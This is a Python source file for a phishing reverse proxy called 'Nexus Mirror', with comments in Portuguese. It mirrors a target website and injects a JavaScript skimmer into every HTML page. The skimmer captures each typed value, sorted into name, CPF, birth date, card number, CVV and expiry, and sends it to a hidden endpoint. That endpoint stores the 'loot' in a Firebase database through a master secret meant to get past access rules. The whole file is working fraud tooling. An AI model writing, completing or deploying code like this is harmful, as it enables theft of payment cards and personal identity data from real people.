import asyncio
import uuid
import json
import re
import requests
from urllib.parse import urlparse, urljoin
from aiohttp import web, ClientSession
import logging

class PlaywrightMirrorProxy:
    def __init__(self, target_url, host='127.0.0.1', port=5000, firebase_config=None):
        self.target_url = target_url.rstrip('/')
        self.host = host
        self.port = port
        
        # Configuração do seu Firebase sunshinecursos
        self.fb_url = firebase_config.get('databaseURL', '').rstrip('/') if firebase_config else ""
        self.fb_secret = firebase_config.get('db_secret', '') # Chave mestre para bypass de RLS
        
        self.app = web.Application()
        # Rota secreta que recebe o Loot da Sonda
        self.app.router.add_post('/nexus_gate', self.capture_loot)
        self.app.router.add_route('*', '/{path:.*}', self.handle_request)
        
        self.session = None
        self.logger = logging.getLogger("MirrorProxy")
        self._setup_logger()

    def _setup_logger(self):
        if not self.logger.handlers:
            h = logging.StreamHandler()
            h.setFormatter(logging.Formatter('[%(levelname)s] [NEXUS] %(message)s'))
            self.logger.addHandler(h)
            self.logger.setLevel(logging.INFO)

    def get_injection_script(self):
        """Sonda Nexus: Captura Nome, CPF, Nasc e Cartão (CC)."""
        sid = str(uuid.uuid4())[:8] # ID único de sessão para não misturar dados de clientes
        return f"""
        <script>
        (function() {{
            const sid = "{sid}";
            console.log("[Nexus] Proxy Sync Ativo: " + sid);
            
            document.addEventListener('input', (e) => {{
                const el = e.target;
                let val = el.value;
                let type = (el.name || el.id || el.placeholder || "").toLowerCase();
                
                // Mapeamento Inteligente de Campos
                let category = "generic";
                if (type.includes('cpf')) category = "CPF";
                else if (type.includes('nome') || type.includes('name')) category = "NOME_COMPLETO";
                else if (type.includes('nasc') || type.includes('data') || type.includes('birth')) category = "DATA_NASC";
                else if (type.includes('card') || type.includes('cartao') || type.includes('number')) category = "CC_NUMBER";
                else if (type.includes('cvv') || type.includes('cvc')) category = "CC_CVV";
                else if (type.includes('exp') || type.includes('valid')) category = "CC_EXP";

                // Envio invisível para o Proxy Local (Bypass CORS)
                fetch('/nexus_gate', {{
                    method: 'POST',
                    body: JSON.stringify({{ sid, type: category, val }}),
                    headers: {{ 'Content-Type': 'application/json' }}
                }});
            }});
        }})();
        </script>
        """

    async def capture_loot(self, request):
        """Registra os dados no Firebase sunshinecursos de forma definitiva."""
        try:
            loot = await request.json()
            if self.fb_url:
                # Caminho organizado no banco: loot / SID / Tipo de Dado
                path = f"{self.fb_url}/loot/{loot['sid']}.json"
                if self.fb_secret:
                    path += f"?auth={self.fb_secret}"
                
                # PATCH: Adiciona ou atualiza campos sem apagar os outros
                requests.patch(path, json={loot['type']: loot['val']})
            
            self.logger.info(f"💰 LOOT CAPTURADO [{loot['sid']}]: {loot['type']} -> {loot['val']}")
            return web.Response(status=200)
        except Exception as e:
            self.logger.error(f"Erro ao salvar no Firebase: {e}")
            return web.Response(status=400)

    async def handle_request(self, request):
        """Gerencia o espelhamento 1:1 e injeção do script."""
        path = request.match_info.get('path', '')
        target_full_url = urljoin(self.target_url, f"/{path}")
        if request.query_string:
            target_full_url += f"?{request.query_string}"

        headers = dict(request.headers)
        headers.pop('Host', None)
        headers.pop('Accept-Encoding', None) # Evita compressão para facilitar a injeção
        
        try:
            async with self.session.request(
                method=request.method,
                url=target_full_url,
                headers=headers,
                data=await request.read(),
                allow_redirects=False,
                ssl=False
            ) as resp:
                
                proxy_resp = web.StreamResponse(status=resp.status)
                for k, v in resp.headers.items():
                    if k.title() not in ['Transfer-Encoding', 'Content-Encoding', 'Content-Length']:
                        proxy_resp.headers[k] = v
                
                # Injeta o script apenas em arquivos HTML
                is_html = 'text/html' in resp.headers.get('Content-Type', '').lower()
                
                if is_html:
                    raw_content = await resp.read()
                    html_text = raw_content.decode('utf-8', errors='ignore')
                    
                    # Injeta a sonda e faz o rewrite de domínios
                    html_text = html_text.replace('</body>', self.get_injection_script() + '</body>')
                    html_text = html_text.replace(self.target_url, f"http://{self.host}:{self.port}")
                    
                    proxy_resp.content_length = len(html_text.encode('utf-8'))
                    await proxy_resp.prepare(request)
                    await proxy_resp.write(html_text.encode('utf-8'))
                    return proxy_resp
                
                # Streaming para assets binários (Imagens, JS, CSS)
                await proxy_resp.prepare(request)
                async for chunk in resp.content.iter_chunked(8192):
                    await proxy_resp.write(chunk)
                return proxy_resp
                
        except Exception as e:
            self.logger.error(f"Erro no Proxy: {e}")
            return web.Response(status=502)

    async def start(self):
        self.session = ClientSession()
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.port)
        await site.start()
        self.logger.info(f"✅ Nexus Mirror ON: http://{self.host}:{self.port}")
        return runner

    async def stop(self, runner):
        await runner.cleanup()
        if self.session: 
            await self.session.close()